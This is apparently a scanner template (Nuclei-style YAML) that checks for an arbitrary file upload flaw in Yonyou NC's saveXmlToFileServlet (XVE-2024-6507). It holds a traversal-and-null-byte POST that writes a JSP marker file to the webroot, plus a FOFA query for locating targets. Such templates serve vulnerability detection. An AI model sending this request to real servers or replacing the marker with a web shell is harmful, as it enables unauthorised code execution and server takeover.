@@ -1,0 +1,40 @@
+http:
+    - raw:
+        - |
+          POST /portal/pt/servlet/saveXmlToFileServlet/doPost?pageId=login&filename=..\\..\\..\\webapps\\nc_web\\{{username}}.jsp%00 HTTP/1.1
+          Host: {{Hostname}}
+          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+          Content-Type: application/octet-stream
+
+          %3C%25out.print%28%22pboyjnnrfipmplsukdeczudsefxmywe%22%29%3B%25%3E
+    - matchers:
+        - part: body
+          type: word
+          words:
+            - pboyjnnrfipmplsukdeczudsefxmywe
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      raw:
+        - |
+          GET /{{username}}.jsp HTTP/1.1
+          Host: {{Hostname}}
+          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+id: yongyouNC-saveXmlToFIleServlet-File-upload-XVE-2024-6507
+info:
+    author: Superhero
+    description: |-
+        fofa: app="用友-UFIDA-NC"
+        用友 NC saveXmlToFIleServlet接口处存在任意文件上传漏洞，，攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。
+    name: 用友 NC saveXmlToFIleServlet 任意文件上传漏洞(XVE-2024-6507)
+    reference:
+        - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247488162&idx=1&sn=c0a4ed867540fb32daba33e4c392a250&chksm=c267a791f5102e875ebe58fe417f4739c0bda6ea739daedfedfd8c6a8a1036608e04973a2bf6&token=350950895&lang=zh_CN#rd
+    severity: high
+    tags:
+        - 用友-ufida
+        - Eserv
+        - Servlet
+        - eserv
+variables:
+    username: '{{to_lower(rand_base(6))}}'
